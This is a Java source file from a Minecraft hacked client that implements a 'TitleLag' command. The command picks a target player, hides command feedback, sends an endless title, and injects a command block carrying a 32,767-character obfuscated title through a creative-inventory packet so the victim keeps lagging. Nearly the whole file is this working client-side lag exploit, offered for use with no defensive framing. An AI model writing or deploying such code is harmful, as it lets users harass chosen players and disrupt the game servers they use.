/*
 * Copyright (c) 2022 Coffee Client, 0x150 and contributors. All rights reserved.
 */

package vertex.client.feature.command.impl;

import vertex.client.feature.command.argument.PlayerFromNameArgumentParser;
import vertex.client.feature.command.coloring.ArgumentType;
import vertex.client.feature.command.coloring.PossibleArgument;
import vertex.client.feature.command.coloring.StaticArgumentServer;
import vertex.client.feature.command.exception.CommandException;
import vertex.client.VertexMain;
import vertex.client.feature.command.Command;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import java.util.Objects;

public class TitleLag extends Command {
    public TitleLag() {
        super("TitleLag", "Lag players with big ass titles", "lag", "titleLag");
    }

    @Override
    public PossibleArgument getSuggestionsWithType(int index, String[] args) {
        return StaticArgumentServer.serveFromStatic(index, new PossibleArgument(ArgumentType.PLAYER,
                Objects.requireNonNull(VertexMain.client.world)
                        .getPlayers()
                        .stream()
                        .map(abstractClientPlayerEntity -> abstractClientPlayerEntity.getGameProfile().getName())
                        .toList()
                        .toArray(String[]::new)
        ));
    }

    @Override
    public void onExecute(String[] args) throws CommandException {
        validateArgumentsLength(args, 1, "Provide target player");
        PlayerEntity target = new PlayerFromNameArgumentParser(true).parse(args[0]);
        String targetName = target.getGameProfile().getName();
        VertexMain.client.player.sendChatMessage("/gamerule sendCommandFeedback false");
        VertexMain.client.player.sendChatMessage("/title " + targetName + " times 0 999999999 0");
        VertexMain.client.player.sendChatMessage("/gamerule sendCommandFeedback true");
        ItemStack stack = new ItemStack(Items.COMMAND_BLOCK, 1);
        try {
            stack.setNbt(StringNbtReader.parse("{BlockEntityTag:{Command:\"/title " + targetName + " title {\\\"text\\\":\\\"" + "l".repeat(32767) + "\\\",\\\"obfuscated\\\":true}\",powered:0b,auto:1b,conditionMet:1b}}"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        VertexMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + VertexMain.client.player.getInventory().selectedSlot,
                stack
        ));
        message("Place the command block to keep lagging the player");
    }
}
